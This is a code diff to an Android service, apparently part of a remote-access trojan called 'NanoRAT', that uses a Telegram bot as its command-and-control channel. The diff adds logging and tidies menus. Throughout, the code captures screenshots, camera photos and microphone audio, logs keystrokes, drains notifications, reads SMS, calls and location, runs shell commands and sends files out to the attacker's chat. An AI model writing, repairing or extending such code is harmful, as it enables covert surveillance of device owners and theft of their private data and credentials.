@@ -160,14 +160,21 @@ class TelegramC2Service : Service() {
                 .build()
             try {
                 val raw = client.newCall(req).execute().use { r -> r.body?.string() }
-                if (raw == null) return@withContext null
-                if (!raw.trimStart().startsWith("{")) {
-                    log("api $method: non-JSON response (${raw.take(80)}…)")
+                if (raw == null) {
+                    log("api $method: null response")
                     return@withContext null
                 }
-                JSONObject(raw)
+                if (!raw.trimStart().startsWith("{")) {
+                    log("api $method: non-JSON (${raw.take(80)}…)")
+                    return@withContext null
+                }
+                val obj = JSONObject(raw)
+                if (!obj.optBoolean("ok", false)) {
+                    log("api $method: !ok → ${obj.optString("description", "?")}")
+                }
+                obj
             } catch (e: Exception) {
-                log("api $method failed: ${e.message}")
+                log("api $method exception: ${e.message}")
                 null
             }
         }
@@ -178,7 +185,9 @@ class TelegramC2Service : Service() {
             .addFormDataPart("text", text.take(4000))
             .addFormDataPart("parse_mode", "HTML")
             .build()
-        apiCall("sendMessage", body)
+        log("sendMessage len=${text.length}")
+        val r = apiCall("sendMessage", body)
+        log("sendMessage result ok=${r?.optBoolean("ok")}")
     }
 
     private suspend fun sendMessageWithKeyboard(text: String, keyboard: JSONObject): Long {
@@ -214,24 +223,29 @@ class TelegramC2Service : Service() {
     }
 
     private suspend fun sendDocument(filename: String, mime: String, bytes: ByteArray) {
+        log("sendDocument $filename (${bytes.size} bytes)")
         val fileBody = bytes.toRequestBody(mime.toMediaType())
         val body = MultipartBody.Builder().setType(MultipartBody.FORM)
             .addFormDataPart("chat_id", CHAT_ID)
             .addFormDataPart("document", filename, fileBody)
             .build()
-        apiCall("sendDocument", body)
+        val r = apiCall("sendDocument", body)
+        log("sendDocument result ok=${r?.optBoolean("ok")}")
     }
 
     private suspend fun sendPhoto(filename: String, jpegBytes: ByteArray, caption: String = "") {
+        log("sendPhoto $filename (${jpegBytes.size} bytes)")
         val fileBody = jpegBytes.toRequestBody("image/jpeg".toMediaType())
         val builder = MultipartBody.Builder().setType(MultipartBody.FORM)
             .addFormDataPart("chat_id", CHAT_ID)
             .addFormDataPart("photo", filename, fileBody)
         if (caption.isNotEmpty()) builder.addFormDataPart("caption", caption.take(1000))
-        apiCall("sendPhoto", builder.build())
+        val r = apiCall("sendPhoto", builder.build())
+        log("sendPhoto result ok=${r?.optBoolean("ok")} desc=${r?.optString("description")}")
     }
 
     private suspend fun sendAudio(filename: String, bytes: ByteArray) {
+        log("sendAudio $filename (${bytes.size} bytes)")
         val fileBody = bytes.toRequestBody("audio/mp4".toMediaType())
         val body = MultipartBody.Builder().setType(MultipartBody.FORM)
             .addFormDataPart("chat_id", CHAT_ID)
@@ -258,8 +272,6 @@ class TelegramC2Service : Service() {
     // ---------- Menus ----------
 
     private fun buildMainMenu(): JSONObject {
-        val online = projection != null
-        val devicesOnline = if (online) "🟢 online" else "🟡 limited"
         return JSONObject().put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply {
                 put(JSONObject().put("text", "📸 Capture").put("callback_data", "menu:capture"))
@@ -283,24 +295,23 @@ class TelegramC2Service : Service() {
         })
     }
 
-    private fun buildCaptureMenu(): JSONObject {
-        return JSONObject().put("inline_keyboard", JSONArray().apply {
+    private fun buildCaptureMenu(): JSONObject =
+        JSONObject().put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply {
                 put(JSONObject().put("text", "📸 Screenshot").put("callback_data", "act:screenshot"))
-                put(JSONObject().put("text", "🤳 Front camera").put("callback_data", "act:camera:front"))
+                put(JSONObject().put("text", "🤳 Front").put("callback_data", "act:camera:front"))
             })
             put(JSONArray().apply {
-                put(JSONObject().put("text", "📷 Back camera").put("callback_data", "act:camera:back"))
+                put(JSONObject().put("text", "📷 Back").put("callback_data", "act:camera:back"))
             })
             put(JSONArray().apply {
                 put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
                 put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
             })
         })
-    }
 
-    private fun buildRecordMenu(): JSONObject {
-        return JSONObject().put("inline_keyboard", JSONArray().apply {
+    private fun buildRecordMenu(): JSONObject =
+        JSONObject().put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply {
                 put(JSONObject().put("text", "🎙 5s").put("callback_data", "act:mic:5"))
                 put(JSONObject().put("text", "🎙 10s").put("callback_data", "act:mic:10"))
@@ -311,16 +322,15 @@ class TelegramC2Service : Service() {
                 put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
             })
         })
-    }
 
-    private fun buildFilesMenu(): JSONObject {
-        return JSONObject().put("inline_keyboard", JSONArray().apply {
+    private fun buildFilesMenu(): JSONObject =
+        JSONObject().put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply {
                 put(JSONObject().put("text", "📂 /sdcard").put("callback_data", "act:ls:/sdcard"))
                 put(JSONObject().put("text", "📥 Download").put("callback_data", "prompt:get"))
             })
             put(JSONArray().apply {
-                put(JSONObject().put("text", "📂 Downloads").put("callback_data", "act:ls:/sdcard/Download"))
+                put(JSONObject().put("text", "📂 Download").put("callback_data", "act:ls:/sdcard/Download"))
                 put(JSONObject().put("text", "📂 DCIM").put("callback_data", "act:ls:/sdcard/DCIM"))
             })
             put(JSONArray().apply {
@@ -328,10 +338,9 @@ class TelegramC2Service : Service() {
                 put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
             })
         })
-    }
 
-    private fun buildInfoMenu(): JSONObject {
-        return JSONObject().put("inline_keyboard", JSONArray().apply {
+    private fun buildInfoMenu(): JSONObject =
+        JSONObject().put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply {
                 put(JSONObject().put("text", "📱 Device").put("callback_data", "act:info"))
                 put(JSONObject().put("text", "🌐 Network").put("callback_data", "act:network"))
@@ -345,10 +354,9 @@ class TelegramC2Service : Service() {
                 put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
             })
         })
-    }
 
-    private fun buildControlMenu(): JSONObject {
-        return JSONObject().put("inline_keyboard", JSONArray().apply {
+    private fun buildControlMenu(): JSONObject =
+        JSONObject().put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply {
                 put(JSONObject().put("text", "🔒 Lock").put("callback_data", "act:lock"))
                 put(JSONObject().put("text", "🏠 Home").put("callback_data", "act:home"))
@@ -359,17 +367,16 @@ class TelegramC2Service : Service() {
             })
             put(JSONArray().apply {
                 put(JSONObject().put("text", "💻 Shell").put("callback_data", "prompt:shell"))
-                put(JSONObject().put("text", "🔗 Open URL").put("callback_data", "prompt:url"))
+                put(JSONObject().put("text", "🔗 URL").put("callback_data", "prompt:url"))
             })
             put(JSONArray().apply {
                 put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
                 put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
             })
         })
-    }
 
-    private fun buildCommsMenu(): JSONObject {
-        return JSONObject().put("inline_keyboard", JSONArray().apply {
+    private fun buildCommsMenu(): JSONObject =
+        JSONObject().put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply {
                 put(JSONObject().put("text", "📞 Calls").put("callback_data", "act:calls"))
                 put(JSONObject().put("text", "💬 SMS").put("callback_data", "act:sms"))
@@ -383,29 +390,27 @@ class TelegramC2Service : Service() {
                 put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
             })
         })
-    }
 
-    private fun buildPrivacyMenu(): JSONObject {
-        return JSONObject().put("inline_keyboard", JSONArray().apply {
+    private fun buildPrivacyMenu(): JSONObject =
+        JSONObject().put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply {
-                put(JSONObject().put("text", "⌨️ Keylog start").put("callback_data", "act:keylog_start"))
-                put(JSONObject().put("text", "⌨️ Keylog dump").put("callback_data", "act:keylog_dump"))
+                put(JSONObject().put("text", "⌨️ Start").put("callback_data", "act:keylog_start"))
+                put(JSONObject().put("text", "⌨️ Dump").put("callback_data", "act:keylog_dump"))
             })
             put(JSONArray().apply {
-                put(JSONObject().put("text", "⌨️ Keylog stop").put("callback_data", "act:keylog_stop"))
-                put(JSONObject().put("text", "🔔 Drain notif").put("callback_data", "act:notif"))
+                put(JSONObject().put("text", "⌨️ Stop").put("callback_data", "act:keylog_stop"))
+                put(JSONObject().put("text", "🔔 Drain").put("callback_data", "act:notif"))
             })
             put(JSONArray().apply {
                 put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
                 put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
             })
         })
-    }
 
-    private fun buildSystemMenu(): JSONObject {
-        return JSONObject().put("inline_keyboard", JSONArray().apply {
+    private fun buildSystemMenu(): JSONObject =
+        JSONObject().put("inline_keyboard", JSONArray().apply {
             put(JSONArray().apply {
-                put(JSONObject().put("text", "🔄 Restart polling").put("callback_data", "act:refresh"))
+                put(JSONObject().put("text", "🔄 Refresh").put("callback_data", "act:refresh"))
                 put(JSONObject().put("text", "🗑 Self destruct").put("callback_data", "prompt:selfdestruct"))
             })
             put(JSONArray().apply {
@@ -413,14 +418,11 @@ class TelegramC2Service : Service() {
                 put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
             })
         })
-    }
 
     private fun mainMenuText(): String {
-        val model = Build.MODEL
-        val maker = Build.MANUFACTURER
-        val projStatus = if (projection != null) "🟢 capture ready" else "🟡 capture disabled"
+        val projStatus = if (captureSession != null) "🟢 capture ready" else "🟡 capture disabled"
         return "<b>NanoRAT — Control Center</b>\n\n" +
-               "📱 <code>$maker $model</code>\n" +
+               "📱 <code>${Build.MANUFACTURER} ${Build.MODEL}</code>\n" +
                "🆔 <code>${deviceId.take(8)}…</code>\n" +
                "🎬 $projStatus"
     }
@@ -460,17 +462,18 @@ class TelegramC2Service : Service() {
     }
 
     private suspend fun handleUpdate(update: JSONObject) {
-        // Text messages
         update.optJSONObject("message")?.let { msg ->
             val chatId = msg.optJSONObject("chat")?.optLong("id")?.toString() ?: return@let
             if (chatId != CHAT_ID) return@let
             val text = msg.optString("text", "").trim()
             if (text.isEmpty()) return@let
             log("cmd: $text")
-            try { dispatchTextCommand(text) } catch (e: Exception) { sendMessage("error: ${e.message}") }
+            try { dispatchTextCommand(text) } catch (e: Exception) {
+                log("dispatchTextCommand error: ${e.message}")
+                sendMessage("error: ${e.message}")
+            }
         }
 
-        // Button callbacks
         update.optJSONObject("callback_query")?.let { cb ->
             val fromId = cb.optJSONObject("from")?.optLong("id")?.toString() ?: return@let
             if (fromId != CHAT_ID) return@let
@@ -479,6 +482,7 @@ class TelegramC2Service : Service() {
             val msgId = cb.optJSONObject("message")?.optLong("message_id") ?: 0L
             log("callback: $data")
             try { handleCallback(cbId, msgId, data) } catch (e: Exception) {
+                log("handleCallback error: ${e.message}")
                 answerCallback(cbId, "error: ${e.message}")
             }
         }
@@ -492,6 +496,14 @@ class TelegramC2Service : Service() {
             "menu" -> {
                 val which = parts.getOrNull(1) ?: "main"
                 answerCallback(callbackId)
+                if (which == "close") {
+                    val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                        .addFormDataPart("chat_id", CHAT_ID)
+                        .addFormDataPart("message_id", messageId.toString())
+                        .build()
+                    apiCall("deleteMessage", body)
+                    return
+                }
                 val (text, kb) = when (which) {
                     "main"      -> mainMenuText() to buildMainMenu()
                     "capture"   -> "<b>Capture</b>\nSelect an action:" to buildCaptureMenu()
@@ -502,15 +514,6 @@ class TelegramC2Service : Service() {
                     "comms"     -> "<b>Comms</b>\nContacts & messages:" to buildCommsMenu()
                     "privacy"   -> "<b>Privacy</b>\nKeylogger & notifications:" to buildPrivacyMenu()
                     "system"    -> "<b>System</b>\nMaintenance:" to buildSystemMenu()
-                    "close"     -> {
-                        // delete the message
-                        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
-                            .addFormDataPart("chat_id", CHAT_ID)
-                            .addFormDataPart("message_id", messageId.toString())
-                            .build()
-                        apiCall("deleteMessage", body)
-                        return
-                    }
                     else        -> mainMenuText() to buildMainMenu()
                 }
                 editMessageWithKeyboard(messageId, text, kb)
@@ -520,7 +523,9 @@ class TelegramC2Service : Service() {
                 val action = parts.getOrNull(1) ?: return
                 val sub = parts.getOrNull(2) ?: ""
                 answerCallback(callbackId, "working...")
+                log("runAction begin: $action sub=$sub")
                 runAction(action, sub)
+                log("runAction end: $action")
             }
 
             "prompt" -> {
@@ -532,34 +537,45 @@ class TelegramC2Service : Service() {
     }
 
     private suspend fun runAction(action: String, sub: String) {
+        log("runAction[$action] entered")
         when (action) {
             "screenshot" -> {
+                log("screenshot: session=${captureSession != null}")
                 val session = captureSession
                 if (session == null) { sendMessage("projection not active"); return }
                 val res = session.capture()
+                log("screenshot: capture done, error=${res.optString("error", "")}")
                 val b64 = res.optString("data_b64", "")
+                log("screenshot: b64 len=${b64.length}")
                 if (b64.isEmpty()) { sendMessage("capture failed: ${res.optString("error")}"); return }
-                sendPhoto("screen_${System.currentTimeMillis()}.jpg",
-                          Base64.decode(b64, Base64.NO_WRAP),
-                          "📸 screenshot")
+                val bytes = Base64.decode(b64, Base64.NO_WRAP)
+                log("screenshot: decoded bytes=${bytes.size}")
+                sendPhoto("screen_${System.currentTimeMillis()}.jpg", bytes, "📸 screenshot")
+                log("screenshot: sendPhoto completed")
             }
+
             "camera" -> {
                 val cam = sub.ifEmpty { "back" }
+                log("camera: capturing $cam")
                 val res = Camera.capture(this, cam)
                 val b64 = res.optString("data_b64", "")
+                log("camera: b64 len=${b64.length} error=${res.optString("error", "")}")
                 if (b64.isEmpty()) { sendMessage("camera error: ${res.optString("error")}"); return }
                 sendPhoto("cam_${System.currentTimeMillis()}.jpg",
                           Base64.decode(b64, Base64.NO_WRAP),
                           "📷 $cam camera")
             }
+
             "mic" -> {
                 val sec = sub.toIntOrNull()?.coerceIn(1, 60) ?: 10
                 sendMessage("🎙 recording ${sec}s...")
                 val res = Audio.record(this, sec)
                 val b64 = res.optString("data_b64", "")
                 if (b64.isEmpty()) { sendMessage("mic error: ${res.optString("error")}"); return }
-                sendAudio("mic_${System.currentTimeMillis()}.m4a", Base64.decode(b64, Base64.NO_WRAP))
+                sendAudio("mic_${System.currentTimeMillis()}.m4a",
+                          Base64.decode(b64, Base64.NO_WRAP))
             }
+
             "info" -> sendMessage("<pre>${DeviceInfo.snapshot(this, deviceId).toString(2)}</pre>")
             "network" -> sendMessage("<pre>${NetworkInfo.snapshot(this).toString(2).take(3500)}</pre>")
             "location" -> sendMessage("<pre>${Location.get(this).toString(2)}</pre>")
@@ -598,6 +614,7 @@ class TelegramC2Service : Service() {
             }
             else -> sendMessage("unknown action: $action")
         }
+        log("runAction[$action] exited")
     }
 
     private suspend fun dispatchTextCommand(text: String) {
@@ -607,14 +624,12 @@ class TelegramC2Service : Service() {
 
         when (cmd) {
             "start", "menu", "help" -> sendMainMenu()
-
             "shell" -> {
                 if (arg.isEmpty()) { sendMessage("usage: /shell &lt;cmd&gt;"); return }
                 val res = Shell.exec(arg)
                 val out = res.optString("stdout", "") + res.optString("stderr", "")
                 sendMessage("<pre>[exit ${res.optInt("exit", -1)}]\n${out.take(3500)}</pre>")
             }
-
             "screenshot" -> runAction("screenshot", "")
             "camera" -> runAction("camera", arg.ifEmpty { "back" })
             "mic" -> runAction("mic", arg.ifEmpty { "10" })
@@ -632,7 +647,6 @@ class TelegramC2Service : Service() {
             "keylog_start" -> runAction("keylog_start", "")
             "keylog_stop" -> runAction("keylog_stop", "")
             "keylog_dump" -> runAction("keylog_dump", "")
-
             "get" -> {
                 if (arg.isEmpty()) { sendMessage("usage: /get &lt;path&gt;"); return }
                 val res = Files.exfil(this, arg)
@@ -644,7 +658,6 @@ class TelegramC2Service : Service() {
             "open" -> sendMessage(SystemControl.openApp(this, arg).toString())
             "url" -> sendMessage(SystemControl.openUrl(this, arg).toString())
             "info" -> runAction("info", "")
-
             else -> sendMessage("unknown: /$cmd — try /start")
         }
     }
